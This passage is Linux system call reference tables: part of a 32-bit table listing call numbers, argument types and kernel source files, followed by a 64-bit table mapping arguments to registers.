flags - - mm/msync.c:31 145 sys_readv 0x91 unsigned long fd const struct iovec __user *vec unsigned long vlen - - fs/read_write.c:711 146 sys_writev 0x92 unsigned long fd const struct iovec __user *vec unsigned long vlen - - fs/read_write.c:732 147 sys_getsid 0x93 pid_t pid - - - - kernel/sys.c:1027 148 sys_fdatasync 0x94 unsigned int fd - - - - fs/sync.c:226 149 sys_sysctl 0x95 struct sysctl_args user *args - - - - kernel/sysctl_binary.c:1462 150 sys_mlock 0x96 unsigned long start size_t len - - - mm/mlock.c:491 151 sys_munlock 0x97 unsigned long start size_t len - - - mm/mlock.c:519 152 sys_mlockall 0x98 int flags - - - - mm/mlock.c:556 153 sys_munlockall 0x99 - - - - - mm/mlock.c:584 154 sys_sched_setparam 0x9a pid_t pid struct sched_param __user *param - - - kernel/sched.c:4616 155 sys_sched_getparam 0x9b pid_t pid struct sched_param __user *param - - - kernel/sched.c:4651 156 sys_sched_setscheduler 0x9c pid_t pid int policy struct sched_param __user *param - - kernel/sched.c:4601 157 sys_sched_getscheduler 0x9d pid_t pid - - - - kernel/sched.c:4625 158 sys_sched_yield 0x9e - - - - - kernel/sched.c:4851 159 sys_sched_get_priority_max 0x9f int policy - - - - kernel/sched.c:4989 160 sys_sched_get_priority_min 0xa0 int policy - - - - kernel/sched.c:5014 161 sys_sched_rr_get_interval 0xa1 pid_t pid struct timespec __user *interval - - - kernel/sched.c:5039 162 sys_nanosleep 0xa2 struct timespec __user *rqtp struct timespec __user *rmtp - - - kernel/hrtimer.c:1606 163 sys_mremap 0xa3 unsigned long addr unsigned long old_len unsigned long new_len unsigned long flags unsigned long new_addr mm/mremap.c:510 164 sys_setresuid16 0xa4 old_uid_t ruid old_uid_t euid old_uid_t suid - - kernel/uid16.c:75 165 sys_getresuid16 0xa5 old_uid_t __user *ruid old_uid_t __user *euid old_uid_t __user *suid - - kernel/uid16.c:84 166 sys_vm86 0xa6 unsigned long unsigned long struct pt_regs * - - not found: 167 not implemented 0xa7 - - - - - 168 sys_poll 0xa8 struct pollfd __user *ufds unsigned int nfds long timeout - - fs/select.c:915 169 sys_nfsservctl 0xa9 int cmd struct nfsctl_arg __user *arg void __user *res - - fs/nfsctl.c:86 170 sys_setresgid16 0xaa old_gid_t rgid old_gid_t egid old_gid_t sgid - - kernel/uid16.c:96 171 sys_getresgid16 0xab old_gid_t __user *rgid old_gid_t __user *egid old_gid_t __user *sgid - - kernel/uid16.c:106 172 sys_prctl 0xac int option unsigned long arg2 unsigned long arg3 unsigned long arg4 unsigned long arg5 kernel/sys.c:1466 173 sys_rt_sigreturn 0xad struct pt_regs * - - - - arch/alpha/kernel/entry.S:771 174 sys_rt_sigaction 0xae int sig const struct sigaction __user *act struct sigaction __user *oact size_t sigsetsize - kernel/signal.c:2624 175 sys_rt_sigprocmask 0xaf int how sigset_t __user *set sigset_t __user *oset size_t sigsetsize - kernel/signal.c:2111 176 sys_rt_sigpending 0xb0 sigset_t __user *set size_t sigsetsize - - - kernel/signal.c:2171 177 sys_rt_sigtimedwait 0xb1 const sigset_t __user *uthese siginfo_t __user *uinfo const struct timespec __user *uts size_t sigsetsize - kernel/signal.c:2242 178 sys_rt_sigqueueinfo 0xb2 int pid int sig siginfo_t __user *uinfo - - kernel/signal.c:2404 179 sys_rt_sigsuspend 0xb3 sigset_t __user *unewset size_t sigsetsize - - - kernel/signal.c:2710 180 sys_pread64 0xb4 unsigned int fd char __user *buf size_t count loff_t pos - not found: 181 sys_pwrite64 0xb5 unsigned int fd const char __user *buf size_t count loff_t pos - not found: 182 sys_chown16 0xb6 const char __user *filename old_uid_t user old_gid_t group - - kernel/uid16.c:19 183 sys_getcwd 0xb7 char __user *buf unsigned long size - - - fs/dcache.c:2104 184 sys_capget 0xb8 cap_user_header_t header cap_user_data_t dataptr - - - kernel/capability.c:161 185 sys_capset 0xb9 cap_user_header_t header const cap_user_data_t data - - - kernel/capability.c:235 186 sys_sigaltstack 0xba const stack_t __user * stack_t __user * struct pt_regs * - - arch/alpha/kernel/signal.c:199 187 sys_sendfile 0xbb int out_fd int in_fd off_t __user *offset size_t count - fs/read_write.c:897 188 not implemented 0xbc - - - - - 189 not implemented 0xbd - - - - - 190 sys_vfork 0xbe struct pt_regs * - - - - arch/alpha/kernel/entry.S:746 191 sys_getrlimit 0xbf unsigned int resource struct rlimit __user *rlim - - - kernel/sys.c:1237 192 sys_mmap_pgoff 0xc0 - - - - - mm/mmap.c:1091 193 sys_truncate64 0xc1 const char __user *path loff_t length - - - not found: 194 sys_ftruncate64 0xc2 unsigned int fd loff_t length - - - not found: 195 sys_stat64 0xc3 char __user *filename struct stat64 __user *statbuf - - - fs/stat.c:358 196 sys_lstat64 0xc4 char __user *filename struct stat64 __user *statbuf - - - fs/stat.c:369 197 sys_fstat64 0xc5 unsigned long fd struct stat64 __user *statbuf - - - fs/stat.c:380 198 sys_lchown 0xc6 const char __user *filename uid_t user gid_t group - - fs/open.c:583 199 sys_getuid 0xc7 - - - - - kernel/timer.c:1359 200 sys_getgid 0xc8 - - - - - kernel/timer.c:1371 201 sys_geteuid 0xc9 - - - - - kernel/timer.c:1365 202 sys_getegid 0xca - - - - - kernel/timer.c:1377 203 sys_setreuid 0xcb uid_t ruid uid_t euid - - - kernel/sys.c:594 204 sys_setregid 0xcc gid_t rgid gid_t egid - - - kernel/sys.c:484 205 sys_getgroups 0xcd int gidsetsize gid_t __user *grouplist - - - kernel/groups.c:203 206 sys_setgroups 0xce int gidsetsize gid_t __user *grouplist - - - kernel/groups.c:232 207 sys_fchown 0xcf unsigned int fd uid_t user gid_t group - - fs/open.c:602 208 sys_setresuid 0xd0 uid_t ruid uid_t euid uid_t suid - - kernel/sys.c:696 209 sys_getresuid 0xd1 uid_t __user *ruid uid_t __user *euid uid_t __user *suid - - kernel/sys.c:746 210 sys_setresgid 0xd2 gid_t rgid gid_t egid gid_t sgid - - kernel/sys.c:761 211 sys_getresgid 0xd3 gid_t __user *rgid gid_t __user *egid gid_t __user *sgid - - kernel/sys.c:800 212 sys_chown 0xd4 const char __user *filename uid_t user gid_t group - - fs/open.c:539 213 sys_setuid 0xd5 uid_t uid - - - - kernel/sys.c:655 214 sys_setgid 0xd6 gid_t gid - - - - kernel/sys.c:531 215 sys_setfsuid 0xd7 uid_t uid - - - - kernel/sys.c:819 216 sys_setfsgid 0xd8 gid_t gid - - - - kernel/sys.c:852 217 sys_pivot_root 0xd9 const char __user *new_root const char __user *put_old - - - fs/namespace.c:2184 218 sys_mincore 0xda unsigned long start size_t len unsigned char __user * vec - - mm/mincore.c:256 219 sys_madvise 0xdb unsigned long start size_t len int behavior - - mm/madvise.c:335 220 sys_getdents64 0xdc unsigned int fd struct linux_dirent64 __user *dirent unsigned int count - - fs/readdir.c:273 221 sys_fcntl64 0xdd unsigned int fd unsigned int cmd unsigned long arg - - fs/fcntl.c:452 222 not implemented 0xde - - - - - 223 not implemented 0xdf - - - - - 224 sys_gettid 0xe0 - - - - - kernel/timer.c:1493 225 sys_readahead 0xe1 int fd loff_t offset size_t count - - not found: 226 sys_setxattr 0xe2 const char __user *path const char __user *name const void __user *value size_t size int flags fs/xattr.c:279 227 sys_lsetxattr 0xe3 const char __user *path const char __user *name const void __user *value size_t size int flags fs/xattr.c:298 228 sys_fsetxattr 0xe4 int fd const char __user *name const void __user *value size_t size int flags fs/xattr.c:317 229 sys_getxattr 0xe5 const char __user *path const char __user *name void __user *value size_t size - fs/xattr.c:376 230 sys_lgetxattr 0xe6 const char __user *path const char __user *name void __user *value size_t size - fs/xattr.c:390 231 sys_fgetxattr 0xe7 int fd const char __user *name void __user *value size_t size - fs/xattr.c:404 232 sys_listxattr 0xe8 const char __user *path char __user *list size_t size - - fs/xattr.c:449 233 sys_llistxattr 0xe9 const char __user *path char __user *list size_t size - - fs/xattr.c:463 234 sys_flistxattr 0xea int fd char __user *list size_t size - - fs/xattr.c:477 235 sys_removexattr 0xeb const char __user *path const char __user *name - - - fs/xattr.c:509 236 sys_lremovexattr 0xec const char __user *path const char __user *name - - - fs/xattr.c:527 237 sys_fremovexattr 0xed int fd const char __user *name - - - fs/xattr.c:545 238 sys_tkill 0xee int pid int sig - - - kernel/signal.c:2395 239 sys_sendfile64 0xef int out_fd int in_fd loff_t __user *offset size_t count - fs/read_write.c:916 240 sys_futex 0xf0 - - - - - kernel/futex.c:2605 241 sys_sched_setaffinity 0xf1 pid_t pid unsigned int len unsigned long __user *user_mask_ptr - - kernel/sched.c:4765 242 sys_sched_getaffinity 0xf2 pid_t pid unsigned int len unsigned long __user *user_mask_ptr - - kernel/sched.c:4817 243 sys_set_thread_area 0xf3 struct user_desc __user * - - - - arch/mips/kernel/syscall.c:222 244 sys_get_thread_area 0xf4 struct user_desc __user * - - - - not found: 245 sys_io_setup 0xf5 unsigned nr_reqs aio_context_t __user *ctx - - - fs/aio.c:1245 246 sys_io_destroy 0xf6 aio_context_t ctx - - - - fs/aio.c:1283 247 sys_io_getevents 0xf7 aio_context_t ctx_id long min_nr long nr struct io_event __user *events struct timespec __user *timeout fs/aio.c:1808 248 sys_io_submit 0xf8 aio_context_t long struct iocb user * user * - - fs/aio.c:1711 249 sys_io_cancel 0xf9 aio_context_t ctx_id struct iocb __user *iocb struct io_event __user *result - - fs/aio.c:1746 250 sys_fadvise64 0xfa int fd loff_t offset size_t len int advice - not found: 251 not implemented 0xfb - - - - - 252 sys_exit_group 0xfc int error_code - - - - kernel/exit.c:1087 253 sys_lookup_dcookie 0xfd u64 cookie64 char __user *buf size_t len - - not found: 254 sys_epoll_create 0xfe int size - - - - fs/eventpoll.c:1215 255 sys_epoll_ctl 0xff int epfd int op int fd struct epoll_event __user *event - fs/eventpoll.c:1228 256 sys_epoll_wait 0x100 int epfd struct epoll_event __user *events int maxevents int timeout - fs/eventpoll.c:1320 257 sys_remap_file_pages 0x101 unsigned long start unsigned long size unsigned long prot unsigned long pgoff unsigned long flags mm/fremap.c:123 258 sys_set_tid_address 0x102 int __user *tidptr - - - - kernel/fork.c:920 259 sys_timer_create 0x103 clockid_t which_clock struct sigevent __user *timer_event_spec timer_t __user * created_timer_id - - kernel/posix-timers.c:522 260 sys_timer_settime 0x104 timer_t timer_id int flags const struct itimerspec __user *new_setting struct itimerspec __user *old_setting - kernel/posix-timers.c:800 261 sys_timer_gettime 0x105 timer_t timer_id struct itimerspec __user *setting - - - kernel/posix-timers.c:702 262 sys_timer_getoverrun 0x106 timer_t timer_id - - - - kernel/posix-timers.c:732 263 sys_timer_delete 0x107 timer_t timer_id - - - - kernel/posix-timers.c:855 264 sys_clock_settime 0x108 clockid_t which_clock const struct timespec __user *tp - - - kernel/posix-timers.c:941 265 sys_clock_gettime 0x109 clockid_t which_clock struct timespec __user *tp - - - kernel/posix-timers.c:954 266 sys_clock_getres 0x10a clockid_t which_clock struct timespec __user *tp - - - kernel/posix-timers.c:971 267 sys_clock_nanosleep 0x10b clockid_t which_clock int flags const struct timespec __user *rqtp struct timespec __user *rmtp - kernel/posix-timers.c:1001 268 sys_statfs64 0x10c const char __user *path size_t sz struct statfs64 __user *buf - - fs/statfs.c:118 269 sys_fstatfs64 0x10d unsigned int fd size_t sz struct statfs64 __user *buf - - fs/statfs.c:154 270 sys_tgkill 0x10e int tgid int pid int sig - - kernel/signal.c:2383 271 sys_utimes 0x10f char __user *filename struct timeval __user *utimes - - - fs/utimes.c:219 272 sys_fadvise64_64 0x110 int fd loff_t offset loff_t len int advice - not found: 273 not implemented 0x111 - - - - - 274 sys_mbind 0x112 - - - - - mm/mempolicy.c:1232 275 sys_get_mempolicy 0x113 int __user *policy unsigned long __user *nmask unsigned long maxnode unsigned long addr unsigned long flags mm/mempolicy.c:1348 276 sys_set_mempolicy 0x114 int mode unsigned long __user *nmask unsigned long maxnode - - mm/mempolicy.c:1254 277 sys_mq_open 0x115 const char __user *name int oflag mode_t mode struct mq_attr __user *attr - ipc/mqueue.c:673 278 sys_mq_unlink 0x116 const char __user *name - - - - ipc/mqueue.c:746 279 sys_mq_timedsend 0x117 mqd_t mqdes const char __user *msg_ptr size_t msg_len unsigned int msg_prio const struct timespec __user *abs_timeout ipc/mqueue.c:840 280 sys_mq_timedreceive 0x118 mqd_t mqdes char __user *msg_ptr size_t msg_len unsigned int __user *msg_prio const struct timespec __user *abs_timeout ipc/mqueue.c:934 281 sys_mq_notify 0x119 mqd_t mqdes const struct sigevent __user *notification - - - ipc/mqueue.c:1023 282 sys_mq_getsetattr 0x11a mqd_t mqdes const struct mq_attr __user *mqstat struct mq_attr __user *omqstat - - ipc/mqueue.c:1154 283 sys_kexec_load 0x11b unsigned long entry unsigned long nr_segments struct kexec_segment __user *segments unsigned long flags - kernel/kexec.c:939 284 sys_waitid 0x11c int which pid_t pid struct siginfo __user *infop int options struct rusage __user *ru kernel/exit.c:1655 285 not implemented 0x11d - - - - - 286 sys_add_key 0x11e const char __user *_type const char __user *_description const void __user *_payload size_t plen key_serial_t destringid security/keys/keyctl.c:57 287 sys_request_key 0x11f const char __user *_type const char __user *_description const char __user *_callout_info key_serial_t destringid - security/keys/keyctl.c:149 288 sys_keyctl 0x120 int cmd unsigned long arg2 unsigned long arg3 unsigned long arg4 unsigned long arg5 security/keys/keyctl.c:1338 289 sys_ioprio_set 0x121 int which int who int ioprio - - fs/ioprio.c:76 290 sys_ioprio_get 0x122 int which int who - - - fs/ioprio.c:192 291 sys_inotify_init 0x123 - - - - - fs/notify/inotify/inotify_user.c:680 292 sys_inotify_add_watch 0x124 int fd const char __user *path u32 mask - - fs/notify/inotify/inotify_user.c:685 293 sys_inotify_rm_watch 0x125 int fd __s32 wd - - - fs/notify/inotify/inotify_user.c:726 294 sys_migrate_pages 0x126 pid_t pid unsigned long maxnode const unsigned long __user *from const unsigned long __user *to - mm/mempolicy.c:1273 295 sys_openat 0x127 int dfd const char __user *filename int flags int mode - fs/open.c:913 296 sys_mkdirat 0x128 int dfd const char __user * pathname int mode - - fs/namei.c:2093 297 sys_mknodat 0x129 int dfd const char __user * filename int mode unsigned dev - fs/namei.c:2012 298 sys_fchownat 0x12a int dfd const char __user *filename uid_t user gid_t group int flag fs/open.c:558 299 sys_futimesat 0x12b int dfd char __user *filename struct timeval __user *utimes - - fs/utimes.c:191 300 sys_fstatat64 0x12c int dfd char __user *filename struct stat64 __user *statbuf int flag - fs/stat.c:391 301 sys_unlinkat 0x12d int dfd const char __user * pathname int flag - - fs/namei.c:2341 302 sys_renameat 0x12e int olddfd const char __user * oldname int newdfd const char __user * newname - fs/namei.c:2671 303 sys_linkat 0x12f int olddfd const char __user *oldname int newdfd const char __user *newname int flags fs/namei.c:2470 304 sys_symlinkat 0x130 const char __user * oldname int newdfd const char __user * newname - - fs/namei.c:2377 305 sys_readlinkat 0x131 int dfd const char __user *path char __user *buf int bufsiz - fs/stat.c:284 306 sys_fchmodat 0x132 int dfd const char __user * filename mode_t mode - - fs/open.c:474 307 sys_faccessat 0x133 int dfd const char __user *filename int mode - - fs/open.c:286 308 sys_pselect6 0x134 - - - - - fs/select.c:675 309 sys_ppoll 0x135 struct pollfd __user *ufds unsigned int nfds struct timespec __user *tsp const sigset_t __user *sigmask size_t sigsetsize fs/select.c:950 310 sys_unshare 0x136 unsigned long unshare_flags - - - - kernel/fork.c:1624 311 sys_set_robust_list 0x137 struct robust_list_head __user *head size_t len - - - kernel/futex.c:2351 312 sys_get_robust_list 0x138 int pid struct robust_list_head user * user *head_ptr size_t __user *len_ptr - - kernel/futex.c:2373 313 sys_splice 0x139 - - - - - fs/splice.c:1718 314 sys_sync_file_range 0x13a int fd loff_t offset loff_t nbytes unsigned int flags - not found: 315 sys_tee 0x13b int fdin int fdout size_t len unsigned int flags - fs/splice.c:2061 316 sys_vmsplice 0x13c int fd const struct iovec __user *iov unsigned long nr_segs unsigned int flags - fs/splice.c:1692 317 sys_move_pages 0x13d - - - - - mm/migrate.c:1075 318 sys_getcpu 0x13e unsigned __user *cpu unsigned __user *node struct getcpu_cache __user *cache - - kernel/sys.c:1621 319 sys_epoll_pwait 0x13f - - - - - fs/eventpoll.c:1373 320 sys_utimensat 0x140 int dfd char __user *filename struct timespec __user *utimes int flags - fs/utimes.c:173 321 sys_signalfd 0x141 int ufd sigset_t __user *user_mask size_t sizemask - - fs/signalfd.c:265 322 sys_timerfd_create 0x142 int clockid int flags - - - fs/timerfd.c:164 323 sys_eventfd 0x143 unsigned int count - - - - fs/eventfd.c:434 324 sys_fallocate 0x144 int fd int mode loff_t offset loff_t len - not found: 325 sys_timerfd_settime 0x145 int ufd int flags const struct itimerspec __user *utmr struct itimerspec __user *otmr - fs/timerfd.c:194 326 sys_timerfd_gettime 0x146 int ufd struct itimerspec __user *otmr - - - fs/timerfd.c:252 327 sys_signalfd4 0x147 int ufd sigset_t __user *user_mask size_t sizemask int flags - fs/signalfd.c:211 328 sys_eventfd2 0x148 unsigned int count int flags - - - fs/eventfd.c:409 329 sys_epoll_create1 0x149 int flags - - - - fs/eventpoll.c:1187 330 sys_dup3 0x14a unsigned int oldfd unsigned int newfd int flags - - fs/fcntl.c:53 331 sys_pipe2 0x14b int __user *fildes int flags - - - fs/pipe.c:1101 332 sys_inotify_init1 0x14c int flags - - - - fs/notify/inotify/inotify_user.c:640 333 sys_preadv 0x14d unsigned long fd const struct iovec __user *vec unsigned long vlen unsigned long pos_l unsigned long pos_h fs/read_write.c:759 334 sys_pwritev 0x14e unsigned long fd const struct iovec __user *vec unsigned long vlen unsigned long pos_l unsigned long pos_h fs/read_write.c:784 335 sys_rt_tgsigqueueinfo 0x14f pid_t tgid pid_t pid int sig siginfo_t __user *uinfo - kernel/signal.c:2437 336 sys_perf_event_open 0x150 struct perf_event_attr __user *attr_uptr pid_t pid int cpu int group_fd unsigned long flags kernel/perf_event.c:5065 337 sys_recvmmsg 0x151 int fd struct mmsghdr __user *msg unsigned int vlen unsigned flags struct timespec __user *timeout net/socket.c:2168 4.2 64系统调用表 %rax System call %rdi %rsi %rdx %r10 %r8 %r9 0 sys_read unsigned int fd char *buf size_t count 1 sys_write unsigned int fd const char *buf size_t count 2 sys_open const char *filename int flags int mode 3 sys_close unsigned int fd 4 sys_stat const char *filename struct stat *statbuf 5 sys_fstat unsigned int fd struct stat *statbuf 6 sys_lstat fconst char *filename struct stat *statbuf 7 sys_poll struct poll_fd *ufds unsigned int nfds long timeout_msecs 8 sys_lseek unsigned int fd off_t offset unsigned int origin 9 sys_mmap unsigned long addr unsigned long len unsigned long prot unsigned long flags unsigned long fd unsigned long off 10 sys_mprotect unsigned long start size_t len unsigned long prot 11 sys_munmap unsigned long addr size_t len 12 sys_brk unsigned long brk 13 sys_rt_sigaction int sig const struct sigaction *act struct sigaction *oact size_t sigsetsize 14 sys_rt_sigprocmask int how sigset_t *nset sigset_t *oset size_t sigsetsize 15 sys_rt_sigreturn unsigned long __unused 16 sys_ioctl unsigned int fd unsigned int cmd unsigned long arg 17 sys_pread64 unsigned long fd char *buf size_t count loff_t pos 18 sys_pwrite64 unsigned int fd const char *buf size_t count loff_t pos 19 sys_readv unsigned long fd const struct iovec *vec unsigned long vlen 20 sys_writev unsigned long fd const struct iovec *vec unsigned long vlen 21 sys_access const char *filename int mode 22 sys_pipe int *filedes 23 sys_select int n fd_set *inp fd_set *outp fd_set*exp struct timeval *tvp 24 sys_sched_yield 25 sys_mremap unsigned long addr unsigned long old_len unsigned long new_len unsigned long flags unsigned long new_addr 26 sys_msync unsigned long start size_t len int flags 27 sys_mincore unsigned long start size_t len unsigned char *vec 28 sys_madvise unsigned long start size_t len_in int behavior 29 sys_shmget key_t key size_t size int shmflg 30 sys_shmat int shmid char *shmaddr int shmflg 31 sys_shmctl int shmid int cmd struct shmid_ds *buf 32 sys_dup unsigned int fildes 33 sys_dup2 unsigned int oldfd unsigned int newfd 34 sys_pause 35 sys_nanosleep struct timespec *rqtp struct timespec *rmtp 36 sys_getitimer int which struct itimerval *value 37 sys_alarm unsigned int seconds 38 sys_setitimer int which struct itimerval *value struct itimerval *ovalue 39 sys_getpid 40 sys_sendfile int out_fd int in_fd off_t *offset size_t count 41 sys_socket int family int type int protocol 42 sys_connect int fd struct sockaddr *uservaddr int addrlen 43 sys_accept int fd struct sockaddr *upeer_sockaddr int *upeer_addrlen 44 sys_sendto int fd void *buff size_t len unsigned flags struct sockaddr *addr int addr_len 45 sys_recvfrom int fd void *ubuf size_t size unsigned flags struct sockaddr *addr int *addr_len 46 sys_sendmsg int fd struct msghdr *msg unsigned flags 47 sys_recvmsg int fd struct msghdr *msg unsigned int flags 48 sys_shutdown int fd int how 49 sys_bind int fd struct sokaddr *umyaddr int addrlen 50 sys_listen int fd int backlog 51 sys_getsockname int fd struct sockaddr *usockaddr int *usockaddr_len 52 sys_getpeername int fd struct sockaddr *usockaddr int *usockaddr_len 53 sys_socketpair int family int type int protocol int *usockvec 54 sys_setsockopt int fd int level int optname char *optval int optlen 55 sys_getsockopt int fd int level int optname char *optval int *optlen 56 sys_clone unsigned long clone_flags unsigned long newsp void *parent_tid void *child_tid 57 sys_fork 58 sys_vfork 59 sys_execve const char *filename const char *const argv[] const char *const envp[] 60 sys_exit int error_code 61 sys_wait4 pid_t upid int *stat_addr int options struct rusage *ru 62 sys_kill pid_t pid int sig 63 sys_uname struct old_utsname *name 64 sys_semget key_t key int nsems int semflg 65 sys_semop int semid struct sembuf *tsops unsigned nsops 66 sys_semctl int semid int semnum int cmd union semun arg 67 sys_shmdt char *shmaddr 68 sys_msgget key_t key int msgflg 69 sys_msgsnd int msqid struct msgbuf *msgp size_t msgsz int msgflg 70 sys_msgrcv int msqid struct msgbuf *msgp size_t msgsz long msgtyp int msgflg 71 sys_msgctl int msqid int cmd struct msqid_ds *buf 72 sys_fcntl unsigned int fd unsigned int cmd unsigned long arg 73 sys_flock unsigned int fd unsigned int cmd 74 sys_fsync unsigned int fd 75 sys_fdatasync unsigned int fd 76 sys_truncate const char *path long length 77 sys_ftruncate unsigned int fd unsigned long length 78 sys_getdents unsigned int fd struct linux_dirent *dirent unsigned int count 79 sys_getcwd char *buf unsigned long size 80 sys_chdir const char *filename 81 sys_fchdir unsigned int fd 82 sys_rename const char *oldname const char *newname 83 sys_mkdir const char *pathname int mode 84 sys_rmdir const char *pathname 85 sys_creat const char *pathname int mode 86 sys_link const char *oldname const char *newname 87 sys_unlink const char *pathname 88 sys_symlink const char *oldname const char *newname 89 sys_readlink const char *path char *buf int bufsiz 90 sys_chmod const char *filename mode_t mode 91 sys_fchmod unsigned int fd mode_t mode 92 sys_chown const char *filename uid_t user gid_t group 93 sys_fchown unsigned int fd uid_t user gid_t group 94 sys_lchown const char *filename uid_t user gid_t group 95 sys_umask int mask 96 sys_gettimeofday struct timeval *tv struct timezone *tz 97 sys_getrlimit unsigned int resource struct rlimit *rlim 98 sys_getrusage int who struct rusage *ru 99 sys_sysinfo struct sysinfo *info 100 sys_times struct sysinfo *info 101 sys_ptrace long request long pid unsigned long addr unsigned long data 102 sys_getuid 103 sys_syslog int type char *buf int len 104 sys_getgid 105 sys_setuid uid_t uid 106 sys_setgid gid_t gid 107 sys_geteuid 108 sys_getegid 109 sys_setpgid pid_t pid pid_t pgid 110 sys_getppid 111 sys_getpgrp 112 sys_setsid 113 sys_setreuid uid_t ruid uid_t euid 114 sys_setregid gid_t rgid gid_t egid 115 sys_getgroups int gidsetsize gid_t *grouplist 116 sys_setgroups int gidsetsize gid_t *grouplist 117 sys_setresuid uid_t *ruid uid_t *euid uid_t *suid 118 sys_getresuid uid_t *ruid uid_t *euid uid_t *suid 119 sys_setresgid gid_t rgid gid_t egid gid_t sgid 120 sys_getresgid gid_t *rgid gid_t *egid gid_t *sgid 121 sys_getpgid pid_t pid 122 sys_setfsuid uid_t uid 123 sys_setfsgid gid_t gid 124 sys_getsid pid_t pid 125 sys_capget cap_user_header_t header cap_user_data_t dataptr 126 sys_capset cap_user_header_t header const cap_user_data_t data 127 sys_rt_sigpending sigset_t *set size_t sigsetsize 128 sys_rt_sigtimedwait const sigset_t *uthese siginfo_t *uinfo const struct timespec *uts size_t sigsetsize 129 sys_rt_sigqueueinfo pid_t pid int sig siginfo_t *uinfo 130 sys_rt_sigsuspend sigset_t *unewset size_t sigsetsize 131 sys_sigaltstack const stack_t *uss stack_t *uoss 132 sys_utime char *filename struct utimbuf *times 133 sys_mknod const char *filename umode_t mode unsigned dev 134 sys_uselib NOT IMPLEMENTED 135 sys_personality unsigned int personality 136 sys_ustat unsigned dev struct ustat *ubuf 137 sys_statfs const char *pathname struct statfs *buf 138 sys_fstatfs unsigned int fd struct statfs *buf 139 sys_sysfs int option unsigned long arg1 unsigned long arg2 140 sys_getpriority int which int who 141 sys_setpriority int which int who int niceval 142 sys_sched_setparam pid_t pid struct sched_param *param 143 sys_sched_getparam pid_t pid struct sched_param *param 144 sys_sched_setscheduler pid_t pid int policy struct sched_param *param 145 sys_sched_getscheduler pid_t pid 146 sys_sched_get_priority_max int policy 147 sys_sched_get_priority_min int policy 148 sys_sched_rr_get_interval pid_t pid struct timespec *interval 149 sys_mlock unsigned long start size_t len 150 sys_munlock unsigned long start size_t len 151 sys_mlockall int flags 152 sys_munlockall 153 sys_vhangup 154 sys_modify_ldt int func void *ptr unsigned long bytecount 155 sys_pivot_root const char *new_root const char *put_old 156 sys__sysctl struct __sysctl_args *args 157 sys_prctl int option unsigned long arg2 unsigned long arg3 unsigned long arg4 unsigned long arg5 158 sys_arch_prctl struct task_struct *task int code unsigned long *addr 159 sys_adjtimex struct timex *txc_p 160 sys_setrlimit unsigned int resource struct rlimit *rlim 161 sys_chroot const char *filename 162 sys_sync 163 sys_acct const char *name 164 sys_settimeofday struct timeval *tv struct timezone *tz 165 sys_mount char *dev_name char *dir_name char *type unsigned long flags void *data 166 sys_umount2 const char *target int flags 167 sys_swapon const char *specialfile int swap_flags 168 sys_swapoff const char *specialfile 169 sys_reboot int magic1 int magic2 unsigned int cmd void *arg 170 sys_sethostname char *name int len 171 sys_setdomainname char *name int len 172 sys_iopl unsigned int level struct pt_regs *regs 173 sys_ioperm unsigned long from unsigned long num int turn_on 174 sys_create_module REMOVED IN Linux 2.6 175 sys_init_module void *umod unsigned long len const char *uargs 176 sys_delete_module const chat *name_user unsigned int flags 177 sys_get_kernel_syms REMOVED IN Linux 2.6 178 sys_query_module REMOVED IN Linux 2.6 179 sys_quotactl unsigned int cmd const char *special qid_t id void *addr 180 sys_nfsservctl NOT IMPLEMENTED 181 sys_getpmsg NOT IMPLEMENTED 182 sys_putpmsg NOT IMPLEMENTED 183 sys_afs_syscall NOT IMPLEMENTED 184 sys_tuxcall NOT IMPLEMENTED 185 sys_security NOT IMPLEMENTED 186 sys_gettid 187 sys_readahead int fd loff_t offset size_t count 188 sys_setxattr const char *pathname const char *name const void *value size_t size int flags 189 sys_lsetxattr const char *pathname const char *name const void *value size_t size int flags 190 sys_fsetxattr int fd const char *name const void *value size_t size int flags 191 sys_getxattr const char *pathname const char *name void *value size_t size 192 sys_lgetxattr const char *pathname const char *name void *value size_t size 193 sys_fgetxattr int fd const har *name void *value size_t size 194 sys_listxattr const char *pathname char *list size_t size 195 sys_llistxattr const char *pathname char *list size_t size 196 sys_flistxattr int fd char *list size_t size 197 sys_removexattr const char *pathname const char *name 198 sys_lremovexattr const char *pathname const char *name 199 sys_fremovexattr int fd const char *name 200 sys_tkill pid_t pid ing sig 201 sys_time time_t *tloc 202 sys_futex u32 *uaddr int op u32 val struct timespec *utime u32 *uaddr2 u32 val3 203 sys_sched_setaffinity pid_t pid unsigned int len unsigned long *user_mask_ptr 204 sys_sched_getaffinity pid_t pid unsigned int len unsigned long *user_mask_ptr 205 sys_set_thread_area NOT IMPLEMENTED. Use arch_prctl 206 sys_io_setup unsigned nr_events aio_context_t *ctxp 207 sys_io_destroy aio_context_t ctx 208 sys_io_getevents aio_context_t ctx_id long min_nr long nr struct io_event *events 209 sys_io_submit aio_context_t ctx_id long nr struct iocb **iocbpp 210 sys_io_cancel aio_context_t ctx_id struct iocb *iocb struct io_event *result 211 sys_get_thread_area NOT IMPLEMENTED. Use arch_prctl 212 sys_lookup_dcookie u64 cookie64 long buf long len 213 sys_epoll_create int size 214 sys_epoll_ctl_old NOT IMPLEMENTED 215 sys_epoll_wait_old NOT IMPLEMENTED 216 sys_remap_file_pages unsigned long start unsigned long size unsigned long prot unsigned long pgoff unsigned long flags 217 sys_getdents64 unsigned int fd struct linux_dirent64 *dirent unsigned int count 218 sys_set_tid_address int *tidptr 219 sys_restart_syscall 220 sys_semtimedop int semid struct sembuf *tsops unsigned nsops const struct timespec *timeout 221 sys_fadvise64 int fd loff_t offset size_t len int advice 222 sys_timer_create const clockid_t which_clock struct sigevent *timer_event_spec timer_t *created_timer_id 223 sys_timer_settime timer_t timer_id int flags const struct itimerspec *new_setting struct itimerspec *old_setting 224 sys_timer_gettime timer_t timer_id struct itimerspec *setting 225 sys_timer_getoverrun timer_t timer_id 226 sys_timer_delete timer_t timer_id 227 sys_clock_settime const clockid_t which_clock const struct timespec *tp 228 sys_clock_gettime const clockid_t which_clock struct timespec *tp 229 sys_clock_getres const clockid_t which_clock struct timespec *tp 230 sys_clock_nanosleep const clockid_t which_clock int flags const struct timespec *rqtp struct timespec *rmtp 231 sys_exit_group int error_code 232 sys_epoll_wait int epfd struct epoll_event *events int maxevents int timeout 233 sys_epoll_ctl int epfd int op int fd struct epoll_event *event 234 sys_tgkill pid_t tgid pid_t pid int sig 235 sys_utimes char *filename struct timeval *utimes 236 sys_vserver NOT IMPLEMENTED 237 sys_mbind unsigned long start unsigned long len unsigned long mode unsigned long *nmask unsigned long maxnode unsigned flags 238 sys_set_mempolicy int mode unsigned long *nmask unsigned long maxnode 239 sys_get_mempolicy int *policy 